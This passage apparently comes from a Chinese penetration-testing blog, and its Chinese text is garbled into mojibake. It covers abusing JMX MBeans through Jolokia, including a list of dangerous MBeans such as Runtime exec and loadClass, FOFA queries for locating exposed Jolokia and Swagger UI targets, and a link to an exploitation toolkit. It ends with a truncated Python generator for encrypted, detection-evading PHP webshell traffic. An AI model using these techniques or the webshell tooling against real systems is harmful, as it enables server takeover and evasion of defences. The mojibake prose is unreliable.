  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// è®¢å•åˆ›å»ºç›‘æ§ MBean æ¥å£</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">OrderCreateMonitorMBean</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">getCreateCount</span><span class="params">()</span>; <span class="comment">// ä»Šæ—¥åˆ›å»ºè®¢å•æ•°</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¢å•æ”¯ä»˜ç›‘æ§ MBean æ¥å£</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">OrderPaymentMonitorMBean</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">getPaidCount</span><span class="params">()</span>;   <span class="comment">// ä»Šæ—¥æ”¯ä»˜è®¢å•æ•°</span></span><br><span class="line">    <span class="type">double</span> <span class="title function_">getTotalAmount</span><span class="params">()</span>; <span class="comment">// ä»Šæ—¥æ”¯ä»˜æ€»é‡‘é¢</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¢å•ç‰©æµç›‘æ§ MBean æ¥å£</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">OrderDeliveryMonitorMBean</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">getShippedCount</span><span class="params">()</span>; <span class="comment">// ä»Šæ—¥å·²å‘è´§è®¢å•æ•°</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>å®ç°MBeanæ¥å£</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// è®¢å•åˆ›å»ºç›‘æ§å®ç°ç±»</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderCreateMonitor</span> <span class="keyword">implements</span> <span class="title class_">OrderCreateMonitorMBean</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">createCount</span> <span class="operator">=</span> <span class="number">1500</span>; <span class="comment">// æ¨¡æ‹Ÿä»Šæ—¥åˆ›å»º1500å•</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getCreateCount</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> createCount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¢å•æ”¯ä»˜ç›‘æ§å®ç°ç±»</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderPaymentMonitor</span> <span class="keyword">implements</span> <span class="title class_">OrderPaymentMonitorMBean</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">paidCount</span> <span class="operator">=</span> <span class="number">1200</span>; <span class="comment">// æ¨¡æ‹Ÿä»Šæ—¥æ”¯ä»˜1200å•</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> <span class="variable">totalAmount</span> <span class="operator">=</span> <span class="number">256000.0</span>; <span class="comment">// æ¨¡æ‹Ÿæ€»é‡‘é¢</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getPaidCount</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> paidCount;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getTotalAmount</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> totalAmount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¢å•ç‰©æµç›‘æ§å®ç°ç±»</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderDeliveryMonitor</span> <span class="keyword">implements</span> <span class="title class_">OrderDeliveryMonitorMBean</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">shippedCount</span> <span class="operator">=</span> <span class="number">900</span>; <span class="comment">// æ¨¡æ‹Ÿä»Šæ—¥å‘è´§900å•</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getShippedCount</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> shippedCount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>æ³¨å†ŒMBeanåˆ°ä¸€ä¸ªåŸŸï¼ˆç»„ï¼‰&#x2F;ç”ŸæˆMBeanå‘½ä»¤ï¼šæœ¬è´¨å°±æ˜¯å®ä¾‹åŒ–å¯¹è±¡ï¼Œå¹¶ç»™è¿™ä¸ªå®ä¾‹æŒ‰ç…§è§„èŒƒç»‘å®šä¸€ä¸ªåç§°è®©MBeanServerè®°ä½ã€‚</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.management.ObjectName;</span><br><span class="line"><span class="keyword">import</span> java.lang.management.ManagementFactory;</span><br><span class="line"><span class="keyword">import</span> javax.management.MBeanServer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MultiMBeanRegistration</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">MBeanServer</span> <span class="variable">mbeanServer</span> <span class="operator">=</span> ManagementFactory.getPlatformMBeanServer();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. æ³¨å†Œè®¢å•åˆ›å»ºç›‘æ§ MBean</span></span><br><span class="line">        <span class="type">ObjectName</span> <span class="variable">createMonitorName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectName</span>(</span><br><span class="line">            <span class="string">&quot;com.example.order:type=CreateMonitor,module=order-service,version=2.1&quot;</span></span><br><span class="line">        );</span><br><span class="line">        mbeanServer.registerMBean(<span class="keyword">new</span> <span class="title class_">OrderCreateMonitor</span>(), createMonitorName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. æ³¨å†Œè®¢å•æ”¯ä»˜ç›‘æ§ MBeanï¼ˆåŒä¸€åŸŸï¼Œä¸åŒ typeï¼‰</span></span><br><span class="line">        <span class="type">ObjectName</span> <span class="variable">paymentMonitorName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectName</span>(</span><br><span class="line">            <span class="string">&quot;com.example.order:type=PaymentMonitor,module=payment-service,version=2.1&quot;</span></span><br><span class="line">        );</span><br><span class="line">        mbeanServer.registerMBean(<span class="keyword">new</span> <span class="title class_">OrderPaymentMonitor</span>(), paymentMonitorName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. æ³¨å†Œè®¢å•ç‰©æµç›‘æ§ MBeanï¼ˆåŒä¸€åŸŸï¼Œä¸åŒ typeï¼‰</span></span><br><span class="line">        <span class="type">ObjectName</span> <span class="variable">deliveryMonitorName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectName</span>(</span><br><span class="line">            <span class="string">&quot;com.example.order:type=DeliveryMonitor,module=logistics-service,version=2.1&quot;</span></span><br><span class="line">        );</span><br><span class="line">        mbeanServer.registerMBean(<span class="keyword">new</span> <span class="title class_">OrderDeliveryMonitor</span>(), deliveryMonitorName);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;3ä¸ªMBeanæ³¨å†ŒæˆåŠŸï¼ˆåŒä¸€åŸŸï¼šcom.example.orderï¼‰ï¼š&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;- &quot;</span> + createMonitorName);</span><br><span class="line">        System.out.println(<span class="string">&quot;- &quot;</span> + paymentMonitorName);</span><br><span class="line">        System.out.println(<span class="string">&quot;- &quot;</span> + deliveryMonitorName);</span><br><span class="line">        Thread.sleep(Long.MAX_VALUE); <span class="comment">// ä¿æŒè¿è¡Œ</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>MBeanåç§°åˆ†æ</p>
  <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">MBeanåç§°ï¼šç»„å/åŸŸå:&lt;key=value&gt;ï¼Œ</span><br><span class="line">1. ä¸ºä»€ä¹ˆè¦æœ‰ç»„åï¼šå› ä¸ºæœ‰å¾ˆå¤šçš„MBeanè¦æ³¨å†Œéƒ½MBeanServerä¸­ï¼Œé€šè¿‡ç»„ç®¡ç†èµ·æ¥æ›´åŠ æ–¹ä¾¿ï¼›</span><br><span class="line">2. &lt;key=value&gt;ä½œç”¨ï¼šå¯ä»¥ç†è§£ä¸ºç»™æŸä¸ªå®ä¾‹å–å¾—åˆ«åï¼Œè‡³äºä¸ºä»€ä¹ˆæ˜¯è¿™ç§å½¢å¼ï¼Œéœ€è¦é—®åŸä½œè€…ã€‚è¿™é‡Œçš„keyå®˜æ–¹æ²¡æœ‰å¼ºåˆ¶è§„å®šå«ä»€ä¹ˆåå­—ï¼Œä¸šå†…ä¸€èˆ¬ä¼šè¿™æ ·å†™ï¼štype=ç±»å</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>POSTè®¿é—®jolokiaæ¥å£ï¼ˆä¹Ÿå¯ä»¥GETè®¿é—®ï¼‰ï¼Œè°ƒç”¨MBeanå‘½ä»¤</p>
<ul>
<li><p>è°ƒç”¨è®¢å•åˆ›å»ºç›‘æ§ MBeanï¼ˆè·å–ä»Šæ—¥åˆ›å»ºè®¢å•æ•°ï¼‰</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">curl -X POST http:<span class="comment">//localhost:8080/jolokia/ \</span></span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">    &quot;type&quot;: &quot;read&quot;,</span></span><br><span class="line"><span class="string">    &quot;mbean&quot;: &quot;com.example.order:type=CreateMonitor,module=order-service,version=2.1&quot;,</span></span><br><span class="line"><span class="string">    &quot;attribute&quot;: &quot;CreateCount&quot;</span></span><br><span class="line"><span class="string">  &#125;&#x27;</span></span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  &quot;mbean&quot;: &quot;com.example.order:type=CreateMonitor,module=order-service,version=2.1&quot;  ç†è§£ä¸ºnew OrderCreateMonitor()è¿™ä¸ªå®ä¾‹</span></span><br><span class="line"><span class="comment">  &quot;type&quot;: &quot;read&quot;  ç†è§£ä¸ºè°ƒç”¨è¿™ä¸ªå®ä¾‹ä¸­çš„getteræ–¹æ³•</span></span><br><span class="line"><span class="comment">  &quot;attribute&quot;: &quot;CreateCount&quot;  è¡¨ç¤ºgetterå“ªä¸€ä¸ª</span></span><br><span class="line"><span class="comment">  è¿™ä¸‰éƒ¨åˆ†ç»“åˆèµ·æ¥å°±æ˜¯ï¼šnew OrderCreateMonitor().getCreateCount()</span></span><br><span class="line"><span class="comment">  </span></span><br><span class="line"><span class="comment">**/</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>è°ƒç”¨è®¢å•æ”¯ä»˜ç›‘æ§ MBeanï¼ˆè·å–ä»Šæ—¥æ”¯ä»˜æ€»é‡‘é¢ï¼‰</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">curl -X POST http:<span class="comment">//localhost:8080/jolokia/ \</span></span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">    &quot;type&quot;: &quot;read&quot;,</span></span><br><span class="line"><span class="string">    &quot;mbean&quot;: &quot;com.example.order:type=PaymentMonitor,module=payment-service,version=2.1&quot;,</span></span><br><span class="line"><span class="string">    &quot;attribute&quot;: &quot;TotalAmount&quot;</span></span><br><span class="line"><span class="string">  &#125;&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>æ‰¹é‡è·å–å¤šä¸ª MBean å±æ€§</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">curl -X POST http:<span class="comment">//localhost:8080/jolokia/ \</span></span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;[</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      &quot;type&quot;: &quot;read&quot;,</span></span><br><span class="line"><span class="string">      &quot;mbean&quot;: &quot;com.example.order:type=CreateMonitor,module=order-service,version=2.1&quot;,</span></span><br><span class="line"><span class="string">      &quot;attribute&quot;: &quot;CreateCount&quot;,</span></span><br><span class="line"><span class="string">      &quot;id&quot;: &quot;1&quot;</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      &quot;type&quot;: &quot;read&quot;,</span></span><br><span class="line"><span class="string">      &quot;mbean&quot;: &quot;com.example.order:type=DeliveryMonitor,module=logistics-service,version=2.1&quot;,</span></span><br><span class="line"><span class="string">      &quot;attribute&quot;: &quot;ShippedCount&quot;,</span></span><br><span class="line"><span class="string">      &quot;id&quot;: &quot;2&quot;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  ]&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>POSTè®¿é—®jolokia apiè¯·æ±‚ä½“æ ¼å¼è§£æ</p>
  <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">typeï¼šæ“ä½œç±»å‹ï¼ˆå¿…é€‰ï¼‰ï¼Œå¸¸è§å€¼ä¸ºreadï¼ˆè¯»å±æ€§ï¼‰ã€writeï¼ˆå†™å±æ€§ï¼‰ã€execï¼ˆè°ƒç”¨æ–¹æ³•ï¼‰</span><br><span class="line">mbeanï¼šMBean çš„å…¨åï¼ˆå¿…é€‰ï¼‰ï¼Œæ ¼å¼ä¸ºåŸŸå:é”®=å€¼[,é”®=å€¼]ï¼ˆå¦‚java.lang:type=Memoryï¼‰</span><br><span class="line">attributeï¼šå±æ€§åï¼ˆè¯»/å†™å±æ€§æ—¶å¿…é€‰ï¼‰ï¼Œæ”¯æŒå•ä¸ªå±æ€§ï¼ˆå­—ç¬¦ä¸²ï¼‰æˆ–å¤šä¸ªå±æ€§ï¼ˆæ•°ç»„ï¼‰</span><br><span class="line">valueï¼šå±æ€§å€¼ï¼ˆå†™å±æ€§æ—¶å¿…é€‰ï¼‰ï¼Œéœ€ä¸å±æ€§ç±»å‹åŒ¹é…ï¼ˆå¦‚æ•°å­—ã€å­—ç¬¦ä¸²ã€å¸ƒå°”å€¼ï¼‰</span><br><span class="line">operationï¼šæ–¹æ³•åï¼ˆè°ƒç”¨æ–¹æ³•æ—¶å¿…é€‰ï¼‰</span><br><span class="line">argumentsï¼šæ–¹æ³•å‚æ•°ï¼ˆè°ƒç”¨å¸¦å‚æ–¹æ³•æ—¶å¿…é€‰ï¼‰ï¼Œæ•°ç»„å½¢å¼ï¼Œé¡ºåºä¸æ–¹æ³•å‚æ•°ä¸€è‡´</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>å†…ç½®çš„ä¸€äº›é«˜å±MBeanå‘½ä»¤ï¼Œæ€ä¹ˆé€šè¿‡jolokia apiè°ƒç”¨ï¼Œç”¨çš„æ—¶å€™é—®AI</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. javax.management.loading:type=DefaultLoaderRepository</span><br><span class="line">    å±é™©æ“ä½œï¼šloadClass æˆ– loadClassWithoutBind æ–¹æ³•</span><br><span class="line">    ä½œç”¨ï¼šåŠ è½½å¤–éƒ¨ç±»å­—èŠ‚ç åˆ° JVMã€‚</span><br><span class="line">    é£é™©ï¼šè‹¥æ”»å‡»è€…å¯æ§ç±»å­—èŠ‚ç ï¼ˆå¦‚åŒ…å«æ¶æ„é™æ€ä»£ç å—æˆ–æ–¹æ³•ï¼‰ï¼Œå¯æ‰§è¡Œä»»æ„ä»£ç ï¼ˆå¦‚å‘½ä»¤æ‰§è¡Œã€æ–‡ä»¶è¯»å†™ï¼‰ã€‚</span><br><span class="line">2. com.sun.management:type=DiagnosticCommand</span><br><span class="line">    å±é™©æ“ä½œï¼švmCommand æˆ–å…·ä½“å‘½ä»¤æ–¹æ³•ï¼ˆå¦‚ executeï¼‰</span><br><span class="line">    ä½œç”¨ï¼šæ‰§è¡Œ JVM è¯Šæ–­å‘½ä»¤ï¼ˆå¦‚ jmapã€jstack ç­‰æ•ˆåŠŸèƒ½ï¼‰ã€‚</span><br><span class="line">    é£é™©ï¼šéƒ¨åˆ†å‘½ä»¤å¯è¯»å–è¿›ç¨‹å†…å­˜ã€çº¿ç¨‹ä¿¡æ¯ï¼Œç”šè‡³åœ¨ç‰¹å®š JDK ç‰ˆæœ¬ä¸­é€šè¿‡å‚æ•°æ³¨å…¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</span><br><span class="line">3. java.lang:type=Runtime</span><br><span class="line">    å±é™©æ“ä½œï¼šexec(String command) æ–¹æ³•</span><br><span class="line">    ä½œç”¨ï¼šç›´æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ˆå¦‚ lsã€rmã€bash ç­‰ï¼‰ã€‚</span><br><span class="line">    é£é™©ï¼šæœ€ç›´æ¥çš„å‘½ä»¤æ‰§è¡Œå…¥å£ï¼Œè‹¥å¯è°ƒç”¨ï¼Œæ”»å‡»è€…å¯å®Œå…¨æ§åˆ¶æœåŠ¡å™¨ã€‚</span><br><span class="line">4. java.nio:type=FileSystemï¼ˆéƒ¨åˆ† JDK å®ç°ï¼‰</span><br><span class="line">    å±é™©æ“ä½œï¼šcreateFileã€deleteFileã€write ç­‰æ–‡ä»¶æ“ä½œæ–¹æ³•</span><br><span class="line">    é£é™©ï¼šè¯»å†™ / åˆ é™¤æœåŠ¡å™¨ä»»æ„æ–‡ä»¶ï¼ˆå¦‚ /etc/passwdã€åº”ç”¨é…ç½®æ–‡ä»¶ï¼‰ã€‚</span><br><span class="line">5. java.lang:type=ClassLoading</span><br><span class="line">    å±é™©æ“ä½œï¼šsetClassPath æ–¹æ³•</span><br><span class="line">    ä½œç”¨ï¼šä¿®æ”¹ JVM ç±»åŠ è½½è·¯å¾„ã€‚</span><br><span class="line">    é£é™©ï¼šåŠ è½½æ¶æ„ JAR åŒ…ï¼Œè§¦å‘ä»£ç æ‰§è¡Œã€‚</span><br><span class="line">6. Tomcatï¼šCatalina:type=Manager</span><br><span class="line">	å±é™©æ“ä½œï¼šlistSessionï¼ˆè·å–ä¼šè¯ä¿¡æ¯ï¼‰ã€expireSessionï¼ˆé”€æ¯ä¼šè¯ï¼‰ï¼Œç»“åˆå…¶ä»–æ¼æ´å¯è¶Šæƒã€‚</span><br><span class="line">7. Spring Bootï¼šorg.springframework.boot:type=Admin,name=SpringApplication</span><br><span class="line">	å±é™©æ“ä½œï¼šshutdown æ–¹æ³•ï¼ˆç›´æ¥å…³é—­åº”ç”¨ï¼‰ã€‚</span><br><span class="line">8. JBoss/Wildflyï¼šjboss.system:type=ServerInfo</span><br><span class="line">	å±é™©æ“ä½œï¼šlistDeployments ç»“åˆéƒ¨ç½²æ¥å£å¯ä¸Šä¼ æ¶æ„ WAR åŒ…ã€‚</span><br></pre></td></tr></table></figure>
</li>
<li><p>èµ„äº§å®šä½</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">body=&quot;\&quot;request\&quot;:&#123;\&quot;mbean\&quot;&quot; || body=&quot;\&quot;status\&quot;:200&quot; &amp;&amp; body=&quot;jolokia&quot;</span><br><span class="line">header=&quot;X-Jolokia-Version&quot; || (header=&quot;Content-Type: application/json&quot; &amp;&amp; body=&quot;/jolokia&quot;)</span><br><span class="line">body=&quot;\&quot;error_type\&quot;:\&quot;javax.management\&quot;&quot; &amp;&amp; body=&quot;/jolokia&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>åˆ©ç”¨å·¥å…·ï¼š<a href="https://github.com/laluka/jolokia-exploitation-toolkit">https://github.com/laluka/jolokia-exploitation-toolkit</a></p>
</li>
</ol>
<h3 id="äº§å“æ¼æ´"><a href="#äº§å“æ¼æ´" class="headerlink" title="äº§å“æ¼æ´"></a>äº§å“æ¼æ´</h3><h4 id="OpenApi"><a href="#OpenApi" class="headerlink" title="OpenApi"></a>OpenApi</h4><ol>
<li><p>OpenApiæ˜¯ä¸€å¥—ç”¨æ¥ä»‹ç»å’Œç®€å•æµ‹è¯•ç½‘ç«™ä¸­ä½¿ç”¨åˆ°çš„apiçš„è§„èŒƒï¼Œå¾ˆå¤šçš„åç«¯æ¡†æ¶éƒ½éµå¾ªè¿™å¥—è§„èŒƒå¼€å‘å‡ºäº†è‡ªå·±apiæµ‹è¯•&#x2F;è¯´æ˜çš„å°å·¥å…·ï¼Œæ¯”å¦‚SpringBootçš„SpringDocã€DRFï¼ˆDjango Rest Frameworkï¼‰çš„drf-spectacularã€Flaskçš„flask-restxå’Œflask-openapi3ã€NodeJsçš„swagger-jsdocç­‰ç­‰ã€‚å¹¶ä¸”ï¼ŒOpenApiå®˜æ–¹è¿˜é»˜è®¤æä¾›äº†ä¸€ä¸ªå‰ç«¯é¡µé¢ï¼Œç”¨æ¥åœ¨çº¿æµè§ˆå’Œæµ‹è¯•apiæ¥å£ï¼Œå¾ˆå¤šå®ç°OpenApiçš„å·¥å…·é»˜è®¤éƒ½é‡‡ç”¨è¿™ä¸ªé¡µé¢ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå®ç°OpenApiçš„å·¥å…·&#x2F;æœåŠ¡æœ¬èº«æ²¡æœ‰ä»€ä¹ˆæ¼æ´ï¼ˆåŠŸèƒ½æ¯”è¾ƒå•ä¸€ï¼‰ï¼Œä½†æ˜¯è¯¥é¡µé¢&#x2F;æ¥å£åœ°å€ä¸åº”å½“è¢«å…¬å¼€ï¼ˆæœªæˆæƒè®¿é—®ï¼‰ï¼Œéœ€è¦è®¤è¯åæ‰èƒ½è®¿é—®ï¼Œå¦åˆ™å¾ˆå®¹æ˜“æ³„éœ²ä¸€äº›æ•æ„Ÿçš„ã€æœ‰æ¼æ´çš„apiæ¥å£ã€‚</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110133414687.png" alt="image-20251110133414687"></p>
</li>
<li><p>OpenApiè§„èŒƒæœ€å¼€å§‹å«åšswaggerï¼Œä»2.0ç‰ˆæœ¬ï¼ˆ2014å¹´ï¼‰å¼€å§‹æ­£å¼æ›´åä¸ºOpenApiã€‚å¦‚ä¸Šé¢æ‰€è®²ï¼Œä¸åŒæ¡†æ¶éƒ½æœ‰è‡ªå·±å®ç°OpenApiè§„èŒƒçš„å°ç»„ä»¶ï¼Œä½†åŸºæœ¬ä¸Šéƒ½é»˜è®¤é‡‡ç”¨OpenApiå®˜æ–¹ç»™å‡ºçš„é¡µé¢ä½œä¸ºæµ‹è¯•ç•Œé¢ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡fofaæ‰¹é‡æŸ¥æ‰¾è¿™ä¸ªé¡µé¢ï¼štitle&#x3D;â€Swagger UIâ€</p>
</li>
<li><p>å¦‚æœå·²ç»æœªæˆæƒè®¿é—®åˆ°äº†swagger uiç•Œé¢ï¼Œé‚£ä¹ˆå¯ä»¥æ‰¹é‡æµ‹è¯•å…¶ä¸­çš„apiï¼Œå› ä¸ºè¿™æ˜¯ä¸€ä¸ªé€šç”¨çš„è§„èŒƒï¼Œæ‰€ä»¥ä¸ç®¡ä½ çš„åç«¯æ˜¯javaè¿˜æ˜¯golangæˆ–è€…å…¶ä»–è¯­è¨€ï¼Œåªè¦æŒ‰ç…§è¿™ä¸ªæ ‡å‡†å®ç°äº†SwaggerUIä¸­çš„åŠŸèƒ½ï¼Œä¸”æ³„éœ²äº†è¿™ä¸ªé¡µé¢ï¼Œå°±ä¼šæˆä¸ºå…¶ä»–æ¼æ´æŒ–æ˜&amp;åˆ©ç”¨çš„ä¸€ä¸ªèµ·ç‚¹ï¼šæ¥å£æ–‡æ¡£åœ°å€ï¼ˆä¸€èˆ¬åœ¨swagger uiç•Œé¢ä¸Šä¼šæœ‰æç¤ºï¼Œæ”¹åœ°å€ä»¥çº¯æ–‡æœ¬çš„å½¢å¼è¿”å›æ‰€æœ‰çš„apiæ¥å£ï¼‰&#x3D;&#x3D;&gt; postman&#x2F;apifox &#x3D;&#x3D;&gt; BurpSuite &#x3D;&#x3D;&gt; Xrayã€‚</p>
</li>
</ol>
<h3 id="ä¸­é—´ä»¶æ¼æ´"><a href="#ä¸­é—´ä»¶æ¼æ´" class="headerlink" title="ä¸­é—´ä»¶æ¼æ´"></a>ä¸­é—´ä»¶æ¼æ´</h3><h2 id="Webshellå…æ€"><a href="#Webshellå…æ€" class="headerlink" title="Webshellå…æ€"></a>Webshellå…æ€</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><ol>
<li><p>æµé‡å…æ€</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Protocol.KDF <span class="keyword">import</span> PBKDF2</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_id</span>(<span class="params">length: <span class="built_in">int</span> = <span class="number">8</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;_0x<span class="subst">&#123;<span class="string">&#x27;&#x27;</span>.join(random.choices(string.hexdigits.lower(), k=length))&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key</span>(<span class="params">pwd: <span class="built_in">str</span>, algorithm: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;æ ¹æ®ç®—æ³•ç”Ÿæˆç¬¦åˆé•¿åº¦çš„å¯†é’¥&quot;&quot;&quot;</span></span><br><span class="line">    key_length_map = &#123;</span><br><span class="line">        <span class="string">&#x27;aes-128-cbc&#x27;</span>: <span class="number">16</span>,</span><br><span class="line">        <span class="string">&#x27;aes-192-cbc&#x27;</span>: <span class="number">24</span>,</span><br><span class="line">        <span class="string">&#x27;aes-256-cbc&#x27;</span>: <span class="number">32</span></span><br><span class="line">    &#125;</span><br><span class="line">    key_length = key_length_map[algorithm]</span><br><span class="line">    </span><br><span class="line">    salt = os.urandom(<span class="number">16</span>)</span><br><span class="line">    iterations = <span class="number">100000</span></span><br><span class="line">    key = PBKDF2(pwd.encode(<span class="string">&#x27;utf-8&#x27;</span>), salt, dkLen=key_length, count=iterations)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> key.<span class="built_in">hex</span>(), salt.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_scripts</span>(<span class="params">args</span>):</span><br><span class="line">    key_hex, salt_hex = generate_key(args.pwd, args.algorithm)</span><br><span class="line">    random_id = generate_random_id()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># è§£æç®—æ³•ä½æ•°ï¼ˆä¿®å¤é™¤æ³•é”™è¯¯ï¼‰</span></span><br><span class="line">    algo_bits = <span class="built_in">int</span>(args.algorithm.split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">1</span>])  <span class="comment"># æå–128/192/256å¹¶è½¬ä¸ºæ•´æ•°</span></span><br><span class="line">    key_byte_length = algo_bits // <span class="number">8</span>  <span class="comment"># è®¡ç®—å­—èŠ‚é•¿åº¦ï¼ˆ128/8=16ï¼‰</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># å‰ç«¯JavaScriptè„šæœ¬</span></span><br><span class="line">    frontend_content = <span class="string">f&#x27;&#x27;&#x27;/**</span></span><br><span class="line"><span class="string"> * å‰ç«¯AESåŠ å¯†è„šæœ¬ï¼ˆä¿®å¤å¯†é’¥é•¿åº¦ï¼‰</span></span><br><span class="line"><span class="string"> * å¯†ç ï¼š<span class="subst">&#123;args.pwd&#125;</span> | ç®—æ³•ï¼š<span class="subst">&#123;args.algorithm&#125;</span></span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string">&#x27;use strict&#x27;;</span></span><br><span class="line"><span class="string">const crypto = require(&#x27;crypto&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">module.exports = (pwd, data, ext = &#123;&#123;&#125;&#125;) =&gt; &#123;&#123;</span></span><br><span class="line"><span class="string">    const algorithm = &#x27;<span class="subst">&#123;args.algorithm&#125;</span>&#x27;;</span></span><br><span class="line"><span class="string">    const salt = Buffer.from(&#x27;<span class="subst">&#123;salt_hex&#125;</span>&#x27;, &#x27;hex&#x27;);</span></span><br><span class="line"><span class="string">    // æ´¾ç”Ÿç¬¦åˆé•¿åº¦çš„å¯†é’¥</span></span><br><span class="line"><span class="string">    const key = crypto.pbkdf2Sync(pwd, salt, 100000, <span class="subst">&#123;algo_bits / <span class="number">8</span>&#125;</span>, 